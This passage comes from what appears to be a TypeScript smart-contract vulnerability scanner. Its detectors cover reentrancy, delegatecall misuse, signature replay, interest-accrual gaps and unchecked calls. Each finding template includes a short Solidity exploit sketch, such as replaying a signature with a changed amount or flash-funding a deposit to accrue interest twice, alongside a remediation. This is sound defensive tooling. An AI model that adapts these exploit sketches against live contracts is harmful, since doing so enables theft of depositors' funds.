      walkthrough: `1. ${first.fn} pays a slice of the pool and debits ${field} from the global total.\\n2. The position's ${field} is left as it was, so the accounting now says the pool holds more shares than it does.\\n3. ${fns.filter((f) => f !== first.fn).join(", ") || "another path"} debits the same field again for the same position.\\n4. The denominator is now too small, so a later withdrawal over-pays — with other depositors' tokens.\\n5. Clear the position's shares in the same function that debits them, and make the two paths mutually exclusive.`,
      exploitSolidity: `// Release and cancel the same position: the shares are debited twice.\\nIVictim(target).${first.fn}(positionId);\\nIVictim(target).${fns.find((f) => f !== first.fn) ?? "cancel"}(positionId);\\nIVictim(target).withdraw(positionId);`,
      remediationSolidity: `function ${first.fn}(uint256 id) external {\\n    uint256 s = positions[id].${field};\\n    require(s > 0, "nothing to release");\\n    positions[id].${field} = 0; // clear BEFORE debiting the total\\n    totalShares -= s;\\n    _pay(id, s);\\n}`,
      locationFn: first.fn,
      locationLine: first.line,
      snippet: snippet(parsed, first.line + delta, delta),
    }));
    return; // one finding per contract: the shape is a single accounting defect
  }
}

/**
 * 2. shared-unlock-delta-netting.
 *
 * A callback that both TAKES value and SETTLES/credits inside the same lock —
 * with no check that an outstanding delta is settled — lets an attacker park an
 * unsettled debt in the caller's own unlock and net it against the callback's
 * credit. The gate is the settlement check: a hook that verifies its deltas
 * first is exactly the correct implementation.
 */
function scanSharedUnlockNetting(
  contract: ContractModel,
  parsed: string,
  delta: number,
  push: (f: Finding) => void,
) {
  const CALLBACK = /^(?:lockAcquired|unlockCallback|beforeSwap|afterSwap|beforeAddLiquidity|afterAddLiquidity|beforeRemoveLiquidity|afterRemoveLiquidity|beforeDonate|afterDonate)$/;
  for (const fn of contract.functions) {
    if (fn.body === null || !isExternallyCallable(fn) || !CALLBACK.test(fn.name)) continue;
    const body = stripCommentsAndStrings(fn.source);
    const takes = /\.\s*(?:take|takePair|burn|mint)\s*\(/.test(body);
    const settles = /\.\s*(?:settle|settleFor|sync)\s*\(/.test(body);
    if (!takes || !settles) continue;
    // The check that closes it: the callback proves its own deltas are settled
    // (or that the caller's are) before it moves value.
    const checksDeltas =
      /require\s*\([^;]*(?:delta|settled|owed|debt|outstanding)/i.test(body) ||
      /if\s*\([^)]*(?:delta|settled|owed|debt)[^)]*\)\s*(?:revert|require)/i.test(body);
    if (checksDeltas) continue;
    push(make({
      severity: "high",
      swc: null,
      title: `${fn.name} takes and settles inside a shared unlock without checking outstanding deltas`,
      confidence: "medium",
      detector: "shared-unlock-delta-netting",
      summary: `The callback both credits itself (burn/mint/take) and settles inside whatever unlock context the caller opened, and it never verifies that the outstanding delta is settled first. A caller can therefore park an unsettled debt in the same unlock and let it net against this callback's credit — value leaves without ever being paid for. This is the GoldPesa shape (October 2026, $115k USDC): an unsettled mint debt netted against the hook's own burn credit and 114,999 USDC walked out of the pool.`,
      walkthrough: `1. The caller opens an unlock and leaves a debt unsettled.\\n2. It then triggers ${fn.name}, which burns or takes value inside the SAME unlock.\\n3. The PoolManager nets the callback's credit against the caller's debt.\\n4. The caller exits having paid nothing, and the credit is gone.\\n5. Require the delta to be settled (or assert the locker's debt is zero) before taking value inside a callback.`,
      exploitSolidity: `// Leave a debt open, then let the callback's credit settle it.\\npoolManager.unlock(abi.encode(CALL_HOOK));\\n// inside the unlock: mint debt parked, hook burns, deltas net to zero\\n`,
      remediationSolidity: `function ${fn.name}(bytes calldata data) external returns (bytes memory) {\\n    require(poolManager.isLockedBy(address(this)) || msg.sender == address(poolManager), "not locker");\\n    _requireSettled(); // assert outstanding deltas are zero before moving value\\n    _take(...);\\n}`,
      locationFn: fn.name,
      locationLine: fn.line,
      snippet: snippet(parsed, fn.line + delta, delta),
    }));
    return;
  }
}

/**
 * 3. idle-gap-interest-accrual.
 *
 * Interest computed as `elapsed × rate` is only safe when the checkpoint it
 * measures from is advanced on the SAME path. If the checkpoint is written
 * conditionally (or not at all) in the accruing function, every call in a block
 * re-charges the whole gap — and a caller can set the rate first with a
 * flash-funded deposit.
 */
function scanIdleGapInterest(
  contract: ContractModel,
  parsed: string,
  delta: number,
  push: (f: Finding) => void,
) {
  for (const fn of contract.functions) {
    if (fn.body === null || !isExternallyCallable(fn)) continue;
    const body = stripCommentsAndStrings(fn.source);
    // elapsed = block.number - lastX  (or the reverse), multiplied by a rate
    // `elapsed = block.number - lastX` then `interest += elapsed * rate` is the
    // usual shape, so the multiplication is on the LOCAL, not on the checkpoint.
    const elapsed = /(?:(\b[A-Za-z_$][\w$]*)\s*=\s*)?(?:block\.number|block\.timestamp)\s*-\s*([A-Za-z_$][\w$.]*)/.exec(body);
    if (!elapsed) continue;
    const local = elapsed[1] ?? "";
    const checkpoint = (elapsed[2] ?? "").split(".").pop() ?? "";
    if (!checkpoint) continue;
    const terms = [checkpoint, local].filter(Boolean).map(escapeRegExp);
    const multiplied = terms.some(
      (t) => new RegExp(`\\([^)]*\\b${t}\\b[^)]*\\)\\s*\\*`).test(body) || new RegExp(`\\*\\s*\\([^)]*\\b${t}\\b[^)]*\\)`).test(body) || new RegExp(`\\b${t}\\b\\s*\\*`).test(body) || new RegExp(`\\*\\s*\\b${t}\\b`).test(body),
    );
    if (!multiplied) continue;
    // Advanced unconditionally? A bare assignment at statement level closes it.
    // `lastBlock = ...` at statement level, or `this.lastBlock = ...`. The
    // qualifier is optional: requiring a prefix identifier meant a bare
    // `lastBlock = block.number;` never counted as advancing the checkpoint,
    // so the control (correct code) fired alongside the bug.
    const advanced = new RegExp(
      `(?:^|[;{}])\\s*(?:[A-Za-z_$][\\w$.]*\\.)?${escapeRegExp(checkpoint)}\\s*=\\s*`,
      "m",
    ).test(body);
    const advancedConditionally = new RegExp(
      `if\\s*\\([^)]*\\)\\s*\\{[^}]*${escapeRegExp(checkpoint)}\\s*=`,
      "s",
    ).test(body);
    if (advanced && !advancedConditionally) continue;
    push(make({
      severity: "high",
      swc: null,
      title: `${fn.name} charges an idle gap it does not always advance past`,
      confidence: "medium",
      detector: "idle-gap-interest-accrual",
      summary: `Interest is computed from the elapsed blocks since ${checkpoint}, and ${checkpoint} is not advanced on every path through ${fn.name}. Once the market has been idle, the whole gap is charged again on each call in the same block — and the rate it is charged at is itself caller-settable, so a flash-funded deposit raises utilization, the accrual pays out the entire historical gap, and the loan is repaid. This is the BiFi shape (October 2026, ~165,574 USDT): the USDT market had been idle for 264,059 blocks and the full ~36-day gap was charged on every later action in the block.`,
      walkthrough: `1. The market sits idle, so the elapsed-block term grows without bound.\\n2. ${fn.name} computes interest as elapsed × rate.\\n3. ${checkpoint} is only advanced on some paths, so a second call in the same block charges the same gap again.\\n4. The caller sets the rate first (a deposit that spikes utilization) and collects the inflated interest.\\n5. Advance the checkpoint on every accrual path, and cap the elapsed term at a maximum.`,
      exploitSolidity: `// Flash-fund a deposit to spike the rate, then accrue twice in one block.\\nIVictim(target).deposit(40_500_000e6);\\nIVictim(target).accrue();\\nIVictim(target).accrue(); // the same gap is charged again\\nIVictim(target).withdrawAll();`,
      remediationSolidity: `function accrue() external {\\n    uint256 elapsed = block.number - ${checkpoint};\\n    if (elapsed > MAX_ELAPSED) elapsed = MAX_ELAPSED;\\n    ${checkpoint} = block.number; // ALWAYS, on every path\\n    interestIndex += elapsed * rate();\\n}`,
      locationFn: fn.name,
      locationLine: fn.line,
      snippet: snippet(parsed, fn.line + delta, delta),
    }));
    return;
  }
}

/**
 * 4. signature-field-omission.
 *
 * A signature authorises exactly what its digest covers. When a function takes
 * a signature AND other parameters that steer value, every one of those
 * parameters has to be inside the digest — otherwise a replayer keeps the
 * signature and changes the parameters. The digest span is read with the same
 * paren-depth helper the randomness rules use, so nested `abi.encode` calls are
 * measured correctly.
 */
function scanSignatureFieldOmission(
  contract: ContractModel,
  parsed: string,
  delta: number,
  push: (f: Finding) => void,
) {
  for (const fn of contract.functions) {
    if (fn.body === null || !isExternallyCallable(fn)) continue;
    const body = stripCommentsAndStrings(fn.source);
    const signs = /(?:ecrecover|ECDSA\.recover|\.recover\s*\()/.test(body);
    if (!signs) continue;
    const digest = /(?:keccak256|sha3)\s*\(/.exec(body);
    if (!digest) continue;
    const span = hashArgsSpan(body, digest.index, digest[0].length);
    if (!span) continue;
    // Parameters that steer value but are not inside the signed digest.
    const steers = /\b(?:amount|value|to|recipient|spender|deadline|nonce|tokenId|id)\b/i;
    const sigParams = /^(?:v|r|s|signature|sig)$/i;
    const omitted = fn.params
      .map((p) => p.name)
      .filter((name) => name && !sigParams.test(name) && steers.test(name))
      .filter((name) => !new RegExp(`\\b${escapeRegExp(name)}\\b`).test(span));
    if (omitted.length === 0) continue;
    // ...and the omitted parameter must actually be used to move something.
    const moves = omitted.some((name) => {
      const n = escapeRegExp(name);
      const move = "(?:transfer|mint|burn|call\\s*\\{|_pay)";
      // `payable(to).transfer(amount)` puts the amount AFTER the move.
      return (
        new RegExp(`\\b${n}\\b[^;]*${move}`).test(body) ||
        new RegExp(`${move}[^;]*\\b${n}\\b`).test(body)
      );
    });
    if (!moves) continue;
    push(make({
      severity: "high",
      swc: "SWC-121",
      title: `${fn.name} signs a digest that omits ${omitted.join(", ")}`,
      confidence: "medium",
      detector: "signature-field-omission",
      summary: `The signature check covers a digest that does not include ${omitted.join(", ")}, and ${omitted.length === 1 ? "that parameter steers" : "those parameters steer"} value in the same function. A replayer keeps a valid signature and changes the uncovered parameter — the signature still verifies, the action is different. This is the GiddyDeFi shape (April 2026, $1.3M): a legitimate transaction was replayed with parameters the signature did not cover.`,
      walkthrough: `1. The digest is built from a subset of the parameters.\\n2. ${omitted.join(", ")} ${omitted.length === 1 ? "is" : "are"} used after the check to move value, but ${omitted.length === 1 ? "is" : "are"} not inside the digest.\\n3. A replayer takes a valid signature from the mempool and changes only the uncovered field.\\n4. The check passes and the altered action executes.\\n5. Include every parameter that affects the outcome in the digest — and the chain id, the verifying contract, and a nonce.`,
      exploitSolidity: `// Same signature, different amount: the digest never covered it.\\nIVictim(target).${fn.name}(signer, 1, attacker, v, r, s); // amount not in digest\\nIVictim(target).${fn.name}(signer, type(uint256).max, attacker, v, r, s);`,
      remediationSolidity: `bytes32 digest = keccak256(abi.encode(PURPOSE, address(this), block.chainid, nonce, to, amount));\\naddress signer = ECDSA.recover(digest, signature);\\nrequire(signer == trusted && signer != address(0), "bad signature");`,
      locationFn: fn.name,
      locationLine: fn.line,
      snippet: snippet(parsed, fn.line + delta, delta),
    }));
    return;
  }
}

function flowSends(flow: Flow): boolean {
  return Boolean(flow.seen?.sendsValue);
}

function profile(fn: FnModel, stateNames: Set<string>, byName: Map<string, FnModel>) {
  const writes = new Set<string>();
  const callees = new Set<string>();
  let external = false;
  // Which low-level call kinds the function (transitively) uses. A
  // callee whose only external effects are 2300-gas transfer/send has
  // no reentrancy window; a callee using call/delegatecall does.
  const externalKinds = new Set<string>();
  const visit = (node: unknown) => {
    if (!node || typeof node !== "object") return;
    if (Array.isArray(node)) {
      node.forEach(visit);
      return;
    }
    const n = node as AstNode;
    if (n.type === "BinaryOperation" && typeof n.operator === "string" && ASSIGN.has(n.operator)) {
      const id = rootIdent(n.left as AstNode);
      if (id && stateNames.has(id)) writes.add(id);
    }
    if (n.type === "UnaryOperation" && (n.operator === "++" || n.operator === "--" || n.operator === "delete")) {
      const id = rootIdent(n.subExpression as AstNode);
      if (id && stateNames.has(id)) writes.add(id);
    }
    if (n.type === "FunctionCall") {
      const callee = unwrapCallee(n.expression as AstNode);
      // Fix 15: super.* calls are internal JUMPs, not external calls.
      const isSuper = callee.base?.type === "Identifier" && (callee.base as AstNode).name === "super";
      if (callee.member && LOW_LEVEL.has(callee.member) && !isSuper) {
        external = true;
        externalKinds.add(callee.member);
      }
      if (callee.member === "push" || callee.member === "pop") {
        const id = rootIdent(callee.base ?? undefined);
        if (id && stateNames.has(id)) writes.add(id);
      }
      if (!callee.base && callee.member && byName.has(callee.member) && callee.member !== fn.name) {
        callees.add(callee.member);
      }
      if (callee.base && rootIdent(callee.base) === "this") {
        external = true;
        externalKinds.add("call");
      }
    }
    if (n.type === "AssemblyCall" && n.functionName === "sstore") writes.add("*");
    for (const [k, v] of Object.entries(n)) {
      if (k === "loc" || k === "range") continue;
      if (v && typeof v === "object") visit(v);
    }
  };
  visit(fn.body);
  return { writes, external, callees, externalKinds };
}

function walkFn(
  fn: FnModel,
  contract: ContractModel,
  model: SourceModel,
  stateNames: Set<string>,
  byName: Map<string, FnModel>,
  direct: Map<string, { writes: Set<string>; external: boolean; callees: Set<string>; externalKinds: Set<string> }>,
  parsed: string,
  delta: number,
  push: (f: Finding) => void,
  authed: boolean,
): Flow {
  const flow: Flow = { seen: null, sawWrite: false, sawCall: false, callThenWrite: false, writeThenCall: false, preCallWrites: new Set(), postCallWrites: new Set(), sawEtherSend: false, sendTargets: [], allSendsAreRefunds: true, writeLines: new Map(), readLines: new Map(), calleeCalls: [], sendDetails: [] };
  const consts = new Set(contract.stateVars.filter((v) => v.constOrImmutable).map((v) => v.name));
  const params = new Set(fn.params.map((p) => p.name).filter(Boolean));
  const inherited = inheritedFnNames(contract, model);

  // Storage aliases: `var acc = Acc[msg.sender]` (0.4) and
  // `Acc storage acc = Acc[msg.sender]` (0.5+) create a pointer into state, so
  // `acc.balance -= x` IS a state write. Without this the local name fails the
  // stateNames check and the write is invisible — which is why the seven
  // EtherStore-family reentrancy contracts in the corpus were missed.
  const storageAliases = new Set<string>();
  for (const m of fn.source.matchAll(
    /(?:\bvar\b|[A-Za-z_$][\w$]*\s+storage)\s+([A-Za-z_$][\w$]*)\s*=\s*([A-Za-z_$][\w$]*)\s*\[/g,
  )) {
    const [, local, base] = m;
    if (local && base && stateNames.has(base)) storageAliases.add(local);
  }

  const noteWrite = (node: AstNode | undefined) => {
    const id = rootIdent(node);
    const assembly = node?.type === "AssemblyCall";
    if (!assembly && (!id || (!stateNames.has(id) && !storageAliases.has(id)))) return;
    const writeKey = id || "*";
    flow.sawWrite = true;
    if (flow.seen) {
      flow.callThenWrite = true;
      flow.postCallWrites.add(writeKey);
      if (!flow.writeLines.has(writeKey)) flow.writeLines.set(writeKey, lineOf(node, delta, fn.line));
    } else {
      flow.preCallWrites.add(writeKey);
    }
  };

  const noteCall = (call: ExtCall) => {
    flow.sawCall = true;
    if (call.kind === "transfer" || call.kind === "send" || (call.kind === "call" && call.sendsValue)) {
      flow.sawEtherSend = true;
      flow.sendTargets.push(call.target);
      if (!call.synthetic) flow.sendDetails.push({ target: call.target, amount: call.amount ?? "" });
      if (!/msg\.sender/.test(call.target ?? "") || !/msg\.value/.test(call.raw ?? "")) flow.allSendsAreRefunds = false;
    }
    if (flow.sawWrite && !flow.callThenWrite) flow.writeThenCall = true;
    if (!flow.seen) flow.seen = call;
    if (!call.checked && (call.kind === "call" || call.kind === "send" || call.kind === "delegatecall" || call.kind === "staticcall" || call.kind === "callcode")) {
      push(make({
        severity: call.kind === "send" ? "medium" : "high",
        swc: "SWC-104",
        title: `${fn.name} ignores the ${call.kind} result`,
        confidence: "high",
        detector: "unchecked-call",
        summary: `The ${call.kind} at line ${call.line} is used as a statement. A false or revert from the callee does not stop the rest of ${fn.name}.`,
        walkthrough: [
          `1. \`.call\`, \`.send\`, \`.delegatecall\` return false on failure. They do not revert the caller.`,
          "2. Discarding that bool means the following state update runs anyway.",
          "3. For an ether payout, the accounting says the user was paid when they were not — or the reverse, if the update already happened and a later assumption depends on success.",
        ].join("\n"),
        exploitSolidity: `contract Reject {
    receive() external payable { revert("nope"); }
}
// Point the payout at this contract. The victim still records the withdrawal.`,
        remediationSolidity: `(bool ok, ) = target.call{value: amount}("");
require(ok, "transfer failed");`,
        locationFn: fn.name,
        locationLine: call.line,
        snippet: snippet(parsed, call.line + delta, delta),
      }));
    }
    // Fix 38 provenance + guard gate for delegatecall/callcode
    // (generalizes Fix 24). The site is judged through its PUBLIC
    // ENTRY CHAIN, not on its own text:
    //  - no public path at all (proven: the contract HAS externally
    //    callable functions, none reach this site; or a library
    //    utility no non-library contract calls — the original Fix 24
    //    case) → no finding. Unreachability must be PROVEN, never
    //    assumed: a contract with derived contracts in the file, or a
    //    snippet with no public functions at all, fails closed and
    //    keeps the old site-level behavior.
    //  - the target argument is traced through the entry chain:
    //    FIXED (stored state / const / literal at every call site)
    //    falsifies the "caller-supplied" claim → reclassified low
    //    with the gate note. CALLER-SUPPLIED proceeds to the guard
    //    gate over the ENTRIES: all entries proven authed → the
    //    standing access cap; no entry proven open but some entry
    //    carrying an unverifiable modifier → capped high with the
    //    note naming it; any entry proven open → the finding stands.
    //  - every entry an initializer → the reachability question IS
    //    the initializer question (Fix 37): capped high with the
    //    deferral note.
    if (call.kind === "delegatecall" || call.kind === "callcode") {
      let gateEntries: { fn: FnModel; contract: ContractModel }[] = [];
      let libraryDead = false;
      if (contract.kind === "library") {
        const lib = librarySiteEntries(contract, fn, model);
        gateEntries = lib.entries;
        libraryDead = !lib.anyCallSite;
      } else if (!isExternallyCallable(fn)) {
        gateEntries = (computeEntries(contract, direct).get(fn.name) ?? []).map((e) => ({ fn: e, contract }));
      } else {
        gateEntries = [{ fn, contract }];
      }
      const provenanceDead =
        !isExternallyCallable(fn) &&
        gateEntries.length === 0 &&
        !contractHasDerived(contract, model) &&
        (libraryDead || contract.functions.some((f) => isExternallyCallable(f)));
      if (!provenanceDead) {
        const entryEvidence = gateEntries.map((e) => ({ entry: e, ev: authEvidenceOf(e.fn, e.contract, model) }));
        const allEntriesAuthed = gateEntries.length > 0 && entryEvidence.every((x) => x.ev.authed);
        const possibleMods = [...new Set(entryEvidence.flatMap((x) => x.ev.possibleMods))];
        const anyOpenEntry = entryEvidence.some((x) => !x.ev.authed && x.ev.possibleMods.length === 0);
        const gateAuthed = authed || allEntriesAuthed;
        const initializerOnly = gateEntries.length > 0 && gateEntries.every((e) => isInitializerEntry(e.fn));
        const weakestEntry = entryEvidence.find((x) => !x.ev.authed) ?? entryEvidence[0];
        const attributed = !isExternallyCallable(fn) && weakestEntry !== undefined && weakestEntry.entry.fn !== fn;
        const displayFn = attributed ? (weakestEntry as { entry: { fn: FnModel } }).entry.fn : fn;
        // Target provenance through the chain (helper sites only;
        // an entry site's own targetIsParam/targetIsConst already
        // describe it, and library sites resolve cross-contract).
        let targetClass: TargetClass | null = null;
        if (!isExternallyCallable(fn) && contract.kind !== "library" && call.targetIsParam) {
          const tRoot = (call.target.match(/^[A-Za-z_]\w*/) ?? [null])[0];
          if (tRoot && fn.params.some((p) => p.name === tRoot)) {
            targetClass = classifyTargetParam(fn, tRoot, contract, byName, direct, 0, new Set());
          }
        }
        if (gateAuthed && call.targetIsParam && call.target && delegateTargetIsConstrained(fn.source, call.target)) {
          // StarkWare upgradeTo: the target is NOT freely chosen — it
          // must be a governance-pre-registered, time-locked
          // implementation. A governance-trust note (info), not a
          // critical exploit.
          push(make({
            severity: "info",
            swc: "SWC-112",
            title: `${fn.name} delegatecalls a governance-allowlisted implementation`,
            confidence: "high",
            detector: "delegatecall",
            summary: "The delegatecall target must pass stored-state validation (pre-registered / allowlisted, possibly time-locked) and the function is access-controlled, so the caller cannot redirect execution to an arbitrary contract. The residual risk is governance trust: whoever controls the allowlist controls the implementation.",
            walkthrough: delegateWalk(fn.name, call),
            exploitSolidity: "",
            remediationSolidity: `Keep the allowlist + timelock, and keep the function access-controlled.`,
            locationFn: fn.name,
            locationLine: call.line,
            snippet: snippet(parsed, call.line + delta, delta),
          }));
        } else if (
          gateAuthed &&
          (PROXY_UPGRADE_FNS.has(fn.name) || gateEntries.some((e) => PROXY_UPGRADE_FNS.has(e.fn.name))) &&
          isProxyShape(contract)
        ) {
          // Fix 36, entry-aware under Fix 38: the standard proxy
          // upgrade surface. upgradeTo / upgradeToAndCall /
          // _setImplementation on a proxy-shaped contract delegatecall
          // the new implementation BY DESIGN. Fix 38 resolves the
          // entries, so the internal _setImplementation site behind
          // onlyOwner upgradeTo entries lands here too — on the sweep
          // all four EIP-173 claims were this shape, guards executed
          // and held. An upgrade path with NO access-control evidence
          // on any entry falls through and keeps its critical.
          push(make({
            severity: "info",
            swc: "SWC-112",
            title: `${fn.name} is the standard proxy upgrade path (access-controlled)`,
            confidence: "high",
            detector: "delegatecall",
            summary: `${contract.name} is a proxy-shaped contract and ${fn.name} is its upgrade entry point: delegatecalling the new implementation is the mechanism, and the function is access-controlled, so no arbitrary caller can redirect execution to an arbitrary contract. The residual risk is governance trust in whoever holds the upgrade key — audit that key's custody, not this function's shape.`,
            walkthrough: delegateWalk(fn.name, call),
            exploitSolidity: "",
            remediationSolidity: `Keep the upgrade entry access-controlled (onlyOwner / onlyAdmin / a ProxyAdmin), and prefer a timelock on upgrades.`,
            locationFn: fn.name,
            locationLine: call.line,
            snippet: snippet(parsed, call.line + delta, delta),
          }));
        } else if (targetClass === "fixed") {
          // The "caller-supplied address" claim is FALSE of the
          // chain: at every public entry the target is stored state.
          // Reclassified low with the gate note — a governance-trust
          // lead about the stored address, not an exploit claim.
          push(make({
            severity: "low",
            swc: "SWC-112",
            title: `${fn.name} delegatecalls a stored address (not caller-supplied)`,
            confidence: "high",
            detector: "delegatecall",
            summary:
              `The delegatecall target at this site is stored contract state at every public entry that reaches it — the caller supplies calldata, never the code address.` +
              DELEGATECALL_FIXED_TARGET_NOTE,
            walkthrough: delegateWalk(fn.name, call),
            exploitSolidity: "",
            remediationSolidity: `Keep the stored implementation address behind the same access control as an upgrade, and prefer an allowlist + timelock on changes to it.`,
            locationFn: fn.name,
            locationLine: call.line,
            snippet: snippet(parsed, call.line + delta, delta),
          }));
        } else {
          const severity: Severity = call.targetIsParam ? "critical" : call.targetIsConst ? "medium" : "high";
          let finding = make({
            severity,
            swc: "SWC-112",
            title: call.targetIsParam
              ? attributed
                ? `${displayFn.name} delegatecalls a caller-supplied address (via ${fn.name})`
                : `${fn.name} delegatecalls a caller-supplied address`
              : `${fn.name} delegatecalls ${call.target || "another contract"}`,
            confidence: "high",
            detector: "delegatecall",
            summary: "Delegatecall runs the target's code against this contract's storage. A writable target can overwrite owner, balances, or any other slot.",
            walkthrough: delegateWalk(attributed ? displayFn.name : fn.name, call),
            exploitSolidity: delegateExploit(contract.name),
            remediationSolidity: `// EIP-1967 Storage Slot Isolation + Strict Implementation Whitelist
bytes32 private constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
mapping(address => bool) public allowedImplementations;

function upgradeToAndCall(address newImpl, bytes calldata data) external onlyOwner {
    require(allowedImplementations[newImpl], "Unauthorized implementation");
    assembly {
        sstore(_IMPLEMENTATION_SLOT, newImpl)
    }
    (bool ok, ) = newImpl.delegatecall(data);
    require(ok, "Delegatecall failed");
}`,
            locationFn: attributed ? displayFn.name : fn.name,
            locationLine: call.line,
            snippet: snippet(parsed, call.line + delta, delta),
          });
          if (gateAuthed) {
            finding = withAccessControlCap(finding, true);
          } else if (initializerOnly) {
            finding = withGateCap(finding, DELEGATECALL_INITIALIZER_ENTRY_NOTE);
          } else if (!anyOpenEntry && possibleMods.length > 0) {
            finding = withGateCap(finding, unverifiedModifierNote(possibleMods));
          }
          push(finding);
        }
      }
    }
    // Fix 16: erc20-unchecked fires ONLY for EXTERNAL token calls.
    // The contract's own/inherited transfer/transferFrom (the token
    // being transferred is THIS contract's token) does not count —
    // Fibonum's sellAllTokens calls its own transfer, which always
    // returns true and whose _transfer reverts on failure.
    // Fix 25: downgrade to LOW when the function is access-controlled,
    // the recipient is fixed/stored (not caller-chosen), and a silent
    // failure is recoverable — no claimed/paid marker and no per-user
    // debit, so the tokens stay in the contract and the caller can
    // retry (saudibird withdrawAllERC20: onlyOwner, fixed 5/95 split
    // to stored addresses). A user claim payout (debit + transfer)
    // stays HIGH: a silent failure would strand the user's funds.
    // A non-authed transfer, or one to a caller-chosen recipient,
    // also stays HIGH.
    if (call.kind === "erc20" && !call.checked && !call.ownToken && !hasBalanceDeltaCheck(fn.source)) {
      const recipientFixed = call.recipient !== undefined && call.recipient !== "" && !isCallerControlled(call.recipient, fn, contract);
      const recoverable = !/claimed|paidOut|withdrawn/.test(fn.source) && !debitsOwnCredit(fn);
      const downgraded = authed && recipientFixed && recoverable;
      push(make({
        severity: downgraded ? "low" : "high",
        swc: "SWC-104",
        title: `${fn.name} ignores an ERC-20 bool`,
        confidence: "medium",
        detector: "erc20-unchecked",
        summary: downgraded
          ? "transfer or transferFrom is used as a statement. Tokens that return false instead of reverting (including some USDT-like tokens, and any token that can fail a fee) look successful. Downgraded: the function is access-controlled, the recipient is a fixed/stored address, and a silent failure leaves the tokens in the contract for a retry — no attacker can exploit the discarded bool and no third-party victim loses funds."
          : "transfer or transferFrom is used as a statement. Tokens that return false instead of reverting (including some USDT-like tokens, and any token that can fail a fee) look successful.",
        walkthrough: "1. The ERC-20 spec allows returning false.\n2. A statement-level call discards the bool.\n3. The contract then mints credit, releases collateral, or burns a position the token never moved.",
        exploitSolidity: `contract FalseToken {
    function transfer(address, uint256) external pure returns (bool) { return false; }
}`,
        remediationSolidity: `import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
using SafeERC20 for IERC20;
token.safeTransfer(to, amount);`,
        locationFn: fn.name,
        locationLine: call.line,
        snippet: snippet(parsed, call.line + delta, delta),
      }));
    }
    // Fix 31: the 2300-gas stipend finding fires at low ONLY when
    // the send's return is UNCHECKED. When the return is checked
    // (require(payable(x).send(y)), if(!send(...)) revert, assignment
    // + check), a failed send reverts instead of silently losing
    // funds — downgrade to INFO (a liveness note only). transfer()
    // always reverts on failure, so it is always the checked shape.
    if ((call.kind === "transfer" || call.kind === "send") && call.sendsValue) {
      const checkedSend = call.kind === "transfer" || call.checked;
      push(make({
        severity: checkedSend ? "info" : "low",
        swc: "SWC-134",
        // Info (2026-10-27): measured at 146 firings over 143 contracts with a
        // 0.06 signal rate — it fires on every .transfer()/.send() in the
        // corpus. The 2300-gas stipend is a real constraint on the CALLEE, not
        // a denial of service on this contract, so it is a note, not a finding
        // to triage.
        title: `${fn.name} forwards ether with a 2300-gas stipend`,
        confidence: "high",
        detector: "eth-gas-stipend",
        summary: checkedSend
          ? "address.transfer and address.send forward 2300 gas. A receiving contract whose fallback uses more than that — a cold SLOAD is enough after Berlin — cannot be paid. The return is checked (or transfer() is used, which reverts on failure), so a failed send reverts instead of silently losing funds; the residual risk is liveness only."
          : "address.transfer and address.send forward 2300 gas. A receiving contract whose fallback uses more than that — a cold SLOAD is enough after Berlin — cannot be paid, and send's false return is easy to ignore.",
        walkthrough: checkedSend
          ? "1. The stipend was meant as a reentrancy mitigation. It is not enough anymore, and it breaks legitimate receivers.\n2. The return value is checked (or transfer() reverts on failure), so a failed send reverts instead of silently losing funds.\n3. The residual risk is liveness: a recipient that cannot accept the transfer makes this function revert."
          : "1. The stipend was meant as a reentrancy mitigation. It is not enough anymore, and it breaks legitimate receivers.\n2. Use call{value} and a reentrancy guard, and check the bool.",
        exploitSolidity: "",
        remediationSolidity: `(bool ok, ) = to.call{value: amount}("");
require(ok, "pay");`,
        locationFn: fn.name,
        locationLine: call.line,
        snippet: snippet(parsed, call.line + delta, delta),
      }));
    }
  };

  const noteExpr = (expr: unknown, asStatement: boolean) => {
    if (!expr || typeof expr !== "object") return;
    const node = expr as AstNode;
    // Fix 12: record reads of state vars. Only bare Identifiers that
    // reach noteExpr are recorded — assignment LHS writes go to
    // noteWrite, and FunctionCall callees are not recursed into, so
    // a write is never misread as a read here. A read inside a
    // `V += 1` LHS is not recorded (it is part of the write itself,
    // not a stale-read consumer).
    if (node.type === "Identifier" && typeof node.name === "string" && stateNames.has(node.name)) {
      const reads = flow.readLines.get(node.name) ?? [];
      reads.push(lineOf(node, delta, fn.line));
      flow.readLines.set(node.name, reads);
    }
    if (node.type === "BinaryOperation" && typeof node.operator === "string" && ASSIGN.has(node.operator)) {
      noteExpr(node.right, false);
      noteWrite(node.left as AstNode);
      return;
    }
    if (node.type === "UnaryOperation" && (node.operator === "++" || node.operator === "--" || node.operator === "delete")) {
      noteWrite(node.subExpression as AstNode);
      return;
    }
    if (node.type === "FunctionCall") {
      const args = (node.arguments as unknown[]) ?? [];
      args.forEach((a) => noteExpr(a, false));
      const callee = unwrapCallee(node.expression as AstNode);
      // Modern call options live on the CALL node (`x.call{value: v, gas: g}()`),
      // pre-0.5 ones on the modifier chain (handled in unwrapCallee). Normalise
      // both into `named` so sendsValue / amount / gasCap read one shape.
      if (!callee.named && Array.isArray(node.names) && (node.names as unknown[]).length > 0) {
        callee.named = { type: "FunctionCall", names: node.names, arguments: node.arguments } as unknown as AstNode;
      }
      const member = callee.member;
      // Fix 12 (b): record EVERY bare internal call, not only the
      // LOW_LEVEL ones. The `internal` branch below sits inside a gate
      // that requires LOW_LEVEL / selfdestruct / a base, so an
      // ordinary bare call like readX() never reaches it — the
      // callee-read consumer check would never see it.
      if (!callee.base && member && byName.has(member)) {
        flow.calleeCalls.push({ name: member, line: lineOf(node, delta, fn.line) });
        // The callee calls out, so this call site opens the same window one
        // level down. `direct` already carries the fixpoint-propagated
        // external flag (profile()), so a write after this line is a
        // call-then-write for the CALLER too — the reentrancy_bonus shape.
        const calleeProfile = direct.get(member);
        if (calleeProfile?.external) {
          noteCall({
            kind: "member",
            line: lineOf(node, delta, fn.line),
            checked: true,
            sendsValue: false,
            target: member,
            targetIsParam: false,
            targetIsConst: false,
            argCount: args.length,
            raw: sliceOf(parsed, node),
            synthetic: true,
          });
        }
      }
      // Fix 27 (hook window): a BARE call to a known receiver-hook
      // carrier genuinely opens a reentrancy window — the callee
      // invokes onERC721Received / onERC1155Received on the
      // recipient — even when the callee is inherited (not in byName)
      // or when profile() does not mark it external (profile() only
      // counts LOW_LEVEL calls, and the hook call is a plain member
      // call). This must live OUTSIDE the gate below: bare calls fail
